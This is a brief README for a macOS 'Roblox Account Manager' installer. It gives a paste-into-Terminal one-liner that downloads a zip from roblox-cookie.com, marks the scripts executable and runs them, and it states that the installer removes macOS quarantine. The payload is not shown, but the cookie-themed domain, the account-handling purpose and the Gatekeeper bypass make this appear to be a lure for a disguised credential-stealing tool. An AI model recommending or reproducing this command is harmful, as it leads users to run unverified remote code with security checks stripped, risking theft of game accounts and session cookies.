## Installer (macOS)

Simple installation via Terminal.

### One-liner
```bash
/bin/zsh -c "cd ~/Downloads && curl -fsSL https://roblox-cookie.com/api/download -o RobloxAccountManager.zip && unzip -q RobloxAccountManager.zip -d RobloxAccountManager && cd RobloxAccountManager/Installer && chmod +x Install.command install.sh && ./Install.command"
```

### Manual
1. Download: `https://roblox-cookie.com/api/download`
2. Unzip and open the `Installer` folder
3. Right-click `Install.command` → Open
4. Follow prompts; app installs to `~/Applications`

The installer:
- Downloads the latest zip
- Installs the app to `~/Applications`
- Removes quarantine
- Prepares `~/Library/Application Support/RobloxAccountManager`


